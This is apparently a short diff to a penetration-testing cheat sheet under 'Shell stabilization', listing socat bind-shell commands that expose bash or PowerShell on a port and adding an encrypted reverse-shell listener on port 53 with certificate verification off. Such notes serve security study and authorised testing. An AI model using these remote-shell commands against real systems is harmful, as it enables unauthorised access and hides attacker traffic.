@@ -92,5 +92,9 @@ SHELL STABILIZATION
 				- linux: ```socat TCP-L:<PORT> EXEC:"bash -li"```
 				- Windows: ```socat TCP-L:<PORT> EXEC:powershell.exe,pipes```
 				- call: ```socat TCP:<TARGET-IP>:<TARGET-PORT> -```
+		- Encrypted shells:
+			- Reverse shell:
+				- listener: ```socat openssl-listen:53,cert=<pem file>,verify=0 FILE:`tty`,raw,echo=0```
+				
 	- General:
 		- change terminal size with stty <rows or cols> <num>
